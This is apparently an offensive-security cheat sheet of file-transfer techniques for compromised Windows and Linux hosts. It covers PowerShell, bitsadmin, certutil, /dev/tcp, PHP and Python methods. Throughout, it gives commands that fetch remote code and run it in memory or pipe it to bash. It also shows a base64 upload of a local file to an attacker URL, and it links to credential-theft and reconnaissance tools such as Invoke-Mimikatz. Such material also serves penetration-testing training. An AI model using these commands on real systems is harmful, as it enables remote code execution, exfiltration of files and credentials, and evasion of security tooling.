# File Transfers

## Windows

### Downloads 

#### Powershell (via HTTP)

> `iwr`, `curl`, and `wget`

Any version of `Powershell`:

```powershell
(New-Object System.Net.WebClient).DownloadFile('<URL>',"<DEST_FILEPATH>") # DEST_FILEPATH could be "C:\Users\Public\Downloads\PowerView.ps1" for instance
```

From `PowerShell 3.0`:

```powershell
Invoke-WebRequest <URL> -OutFile <DEST_FILEPATH>
```

Instead of downloading to disk, the payload can instead be executed in memory:

```powershell
IEX (New-Object Net.WebClient).DownloadString('<URL>')

# or directly with a pipeline
Invoke-WebRequest <URL> | iex
```

If we encounter, the error below, we can bypass it with the following flag `-UseBasicParsing`:

![IE error](img/file-transfer/IEerror.png)

```powershell
Invoke-WebRequest <URL> -UseBasicParsing | iex
```

#### Bitsadmin

```powershell
bitsadmin /transfer n <URL> <DEST_FILEPATH>

# or by interacting with powershell
Import-Module bitstransfer;Start-BitsTransfer -Source "<URL>" -Destination "<DEST_FILEPATH>"
```

#### Certutil

> Antimalware Scan Interface (**AMSI**) currently detects the following command as malicious certutil usage

```cmd
certutil.exe -verifyctl -split -f <URL>
```

___

### Uploads

#### Powershell (via HTTP)

```powershell
PS C:\> $b64 = [System.convert]::ToBase64String((Get-Content -Path '<FILE_PATH>' -Encoding Byte))
PS C:\> Invoke-WebRequest -Uri <ATTACKER_URL> -Method POST -Body $b64
```

> On Linux, we can use ` echo <base64> | base64 -d -w 0 > <output_filename>`

#### Powershell (via Bitsadmin)

```powershell
Start-BitsTransfer "<DEST_FILEPATH>" -Destination "<URL>" -TransferType Upload -ProxyUsage Override -ProxyList PROXY01:8080 -ProxyCredential INLANEFREIGHT\svc-sql
```

### Useful URLs

- https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS
- https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1
- https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1
- [DownloadCradles.ps1](https://gist.github.com/HarmJ0y/bb48307ffa663256e239)
___

## Linux

### Downloads

#### Classical commands

```bash
wget <URL> -O <DEST_FILEPATH>

curl -o <DEST_FILEPATH> <URL>
```

#### `/dev/tcp`

```bash
exec 3<>/dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT>
echo -e "GET /<FILENAME> HTTP/1.1\n\n">&3
cat <&3
```

#### PHP

```bash
# file_get_contents()
php -r '$file = file_get_contents("<URL>"); file_put_contents("<FILENAME>",$file);'

# fopen()
php -r 'const BUFFER = 1024; $fremote = 
fopen("<URL>", "rb"); $flocal = fopen("<FILENAME>", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'

# php-curl
php -r '$rfile = "<URL>"; $lfile = "<FILENAME>"; $fp = fopen($lfile, "w+"); $ch = curl_init($rfile); curl_setopt($ch, CURLOPT_FILE, $fp); curl_setopt($ch, CURLOPT_TIMEOUT, 20); curl_exec($ch);'

##  retrieve each line
php -r '$lines = @file("<URL>"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

#### Python2

```bash
python2 -c 'import urllib; urllib.urlretrieve("<URL>", "<FILENAME>")'
```

#### Python3

```bash
python3 -c 'import urllib.request; urllib.request.urlretrieve("<URL>", "<FILENAME>")'
```

> Obviously, other programming languages can be used such as 

___

### Uploads

### Useful URLs

- https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh
- https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh